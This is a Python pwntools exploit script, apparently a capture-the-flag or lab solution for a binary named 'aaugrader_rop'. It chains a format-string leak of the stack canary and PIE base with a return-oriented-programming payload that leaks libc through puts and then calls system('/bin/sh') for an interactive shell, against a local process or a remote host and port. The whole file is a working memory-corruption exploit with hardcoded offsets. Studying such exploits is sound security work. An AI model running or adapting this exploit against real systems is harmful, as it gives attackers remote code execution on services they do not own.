import argparse
import sys
from pathlib import Path

from pwn import *


# Leak address from stack and the canary
def leak_data(proc) -> str:
    proc.recvuntil(b"Semester: ")
    format_leak_canary = "%31$p"
    format_leak_start_address = "%83$p"                  #leaked address of <_start+39>. In order to reach the PIE base address we have to subtract the _start function offset and the value 39.
    format_leak = f"_{format_leak_start_address}:{format_leak_canary}_"
    proc.sendline(format_leak.encode())   

    return str(proc.recvuntil(b"Username: "))

def main(p):

    leaked_data = leak_data(p)
    raw_parsed_addresses = leaked_data.split("_")[1].split("_")[0]
    raw_start_address = raw_parsed_addresses.split(":")[0]
    raw_canary = raw_parsed_addresses.split(":")[1]
    canary = int(raw_canary, 16).to_bytes(4, byteorder="little")
    leaked_start_address = int(raw_start_address, 16)     

    start_offset = 0x11b7                                #calculated offset while debugging
    exe.address = leaked_start_address - start_offset    #calculate the PIE base address

    info("leaked start address: %#x", leaked_start_address)
    info("elf address: %#x", exe.address)
    info("plt puts address: %#x", exe.plt.puts)

    pop_ebx_ret_gadget = exe.address + 0x101e                  # all offsets were extracted readelf locally E.g.: readelf -S ./aaugrader_rop | grep puts
    got_address = exe.address + 0x3f80
    libc_puts_offset = 0x78140
    libc_system_offset = 0x50430
    bin_sh_offset = 0x1c4de8

    payload = b'Q' * 80                                 # padding, same size as the buffer, calculated using ghidra
    payload += canary                                   # place the canary at the correct offset in order to facilitate buffer overflow
    payload += b'A' * 4                                 
    payload += b'B' * 4                                 # padding in order to reach the return address
    payload += b'C' * 4
    payload += p32(pop_ebx_ret_gadget)                  # using a pop ebx; ret; gadget followed by the GOT base address because the payload has overwritten the EBX register (line 42) responsible of holding the GOT base address value                    
    payload += p32(got_address)
    payload += p32(exe.plt.puts)                        # calling puts@plt in order to display the actual libc puts address on the screen (parameter line 47)
    payload += p32(exe.symbols.main)             # returning to the vulnerable function for a final ROP chain
    payload += p32(exe.got.puts)

    print(f"Sending first payload\n {payload}")    
    
    
    p.sendline(payload)

    p.recvuntil(b'Username is too long!\n')

    leaked_got_puts = unpack(p.recv(4).ljust(4, b"\x00")) # receiving the first 4 bytes of the displayed string (by calling puts line 45)
    libc_base = leaked_got_puts - libc_puts_offset        # calculating the libc base address so we can calculate the addresses of system and /bin/sh
    libc_system = libc_base + libc_system_offset
    bin_sh = libc_base + bin_sh_offset

    info("Leaked puts address: %#x", leaked_got_puts)
    info("Libc base: %#x", libc_base)
    info("System addr: %#x", libc_system)
    info("/Bin/sh addr: %#x", bin_sh)

    payload = b'Q' * 80                                 
    payload += canary
    payload += b'A' * 4
    payload += b'B' * 4
    payload += b'C' * 4                                 # final ROP chain that call system(/bin/sh)
    payload += p32(libc_system)
    payload += b"AAAA"
    payload += p32(bin_sh)

    p.sendlineafter(b"Semester: ", b"AAAA")             # sending random value for the first input, no need for another address leak

    print(f"Sending final payload\n {payload}")

    p.sendlineafter(b"Username: ", payload)

    p.interactive()

if __name__=="__main__":

    parser = argparse.ArgumentParser(description='AAU GRADER Exploitation Program 3000')
    parser.add_argument('-b', '--binary', type=str, help='Specify local binary')
    parser.add_argument('-s', '--server', type=str, help='Specify server hostname / ip')
    parser.add_argument('-p', '--port', type=str, help='Specify port for server')
    args = parser.parse_args()

    p = None
    if args.server is None and args.port is None and args.binary is not None:
        BINARY = Path(args.binary)
        exe = context.binary = ELF(str(BINARY))
        p = process(str(BINARY))
    elif args.server is not None and args.port is not None and args.binary is not None:
        BINARY = Path(args.binary)
        exe = context.binary = ELF(str(BINARY))
        p = connect(args.server, int(args.port))
    else:
        print(parser.format_help())
        exit(0)

    main(p)
